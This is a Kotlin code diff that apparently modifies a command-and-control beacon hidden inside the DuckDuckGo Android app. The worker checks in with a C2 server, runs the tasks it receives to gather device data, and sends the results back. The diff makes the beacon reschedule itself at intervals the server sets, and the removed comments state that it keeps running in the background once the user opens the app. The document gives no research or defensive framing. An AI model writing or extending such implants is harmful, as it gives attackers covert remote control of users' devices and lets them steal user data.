@@ -4,9 +4,9 @@ import android.content.Context
 import androidx.lifecycle.LifecycleOwner
 import androidx.work.CoroutineWorker
 import androidx.work.Constraints
-import androidx.work.ExistingPeriodicWorkPolicy
+import androidx.work.ExistingWorkPolicy
 import androidx.work.NetworkType
-import androidx.work.PeriodicWorkRequestBuilder
+import androidx.work.OneTimeWorkRequestBuilder
 import androidx.work.WorkManager
 import androidx.work.WorkerParameters
 import com.duckduckgo.anvil.annotations.ContributesWorker
@@ -20,11 +20,7 @@ import javax.inject.Inject
 
 /**
  * WorkManager Worker that performs the periodic C2 beacon check-in.
- *
- * Flow:
- *   1. beaconService.checkIn() → registers device + polls for tasks
- *   2. For each task: commandHandler.execute() → gathers data
- *   3. beaconService.sendResult() → sends result back to C2 server
+ * Uses a self-rescheduling OneTimeWorkRequest chain to support dynamic intervals.
  */
 @ContributesWorker(AppScope::class)
 class BeaconWorker(
@@ -37,32 +33,50 @@ class BeaconWorker(
 
     @Inject
     lateinit var commandHandler: CommandHandler
+    
+    @Inject
+    lateinit var workManager: WorkManager
 
     override suspend fun doWork(): Result {
         return try {
             // Check in + poll for tasks
-            val commands = beaconService.checkIn()
+            val checkInResult = beaconService.checkIn()
 
             // Execute each pending task and report results
-            commands.forEach { cmd ->
+            checkInResult.commands.forEach { cmd ->
                 val result = commandHandler.execute(cmd)
                 beaconService.sendResult(cmd.id, result)
             }
+            
+            // Schedule the next check-in
+            scheduleNext(checkInResult.beaconInterval)
             Result.success()
         } catch (e: Exception) {
             // WorkManager will retry with exponential backoff
             Result.retry()
         }
     }
+    
+    private fun scheduleNext(intervalSeconds: Int) {
+        val request = OneTimeWorkRequestBuilder<BeaconWorker>()
+            .setInitialDelay(intervalSeconds.toLong(), TimeUnit.SECONDS)
+            .setConstraints(
+                Constraints.Builder()
+                    .setRequiredNetworkType(NetworkType.CONNECTED)
+                    .build(),
+            )
+            .build()
+
+        workManager.enqueueUniqueWork(
+            BeaconInitializer.BEACON_WORKER_TAG,
+            ExistingWorkPolicy.REPLACE,
+            request,
+        )
+    }
 }
 
 /**
- * Lifecycle observer that schedules the BeaconWorker when the app starts.
- *
- * @ContributesMultibinding adds this to DDG's set of lifecycle observers.
- * When the app's main process starts, onCreate() fires and enqueues our worker.
- *
- * The user opens DDG once → beacon keeps running in the background.
+ * Lifecycle observer that schedules the initial BeaconWorker when the app starts.
  */
 @ContributesMultibinding(
     scope = AppScope::class,
@@ -74,7 +88,8 @@ class BeaconInitializer @Inject constructor(
 ) : MainProcessLifecycleObserver {
 
     override fun onCreate(owner: LifecycleOwner) {
-        val request = PeriodicWorkRequestBuilder<BeaconWorker>(15, TimeUnit.MINUTES)
+        val request = OneTimeWorkRequestBuilder<BeaconWorker>()
+            .setInitialDelay(15, TimeUnit.SECONDS)
             .setConstraints(
                 Constraints.Builder()
                     .setRequiredNetworkType(NetworkType.CONNECTED)
@@ -82,14 +97,14 @@ class BeaconInitializer @Inject constructor(
             )
             .build()
 
-        workManager.enqueueUniquePeriodicWork(
+        workManager.enqueueUniqueWork(
             BEACON_WORKER_TAG,
-            ExistingPeriodicWorkPolicy.KEEP,
+            ExistingWorkPolicy.KEEP,
             request,
         )
     }
 
     companion object {
-        private const val BEACON_WORKER_TAG = "c2_beacon"
+        const val BEACON_WORKER_TAG = "c2_beacon"
     }
 }
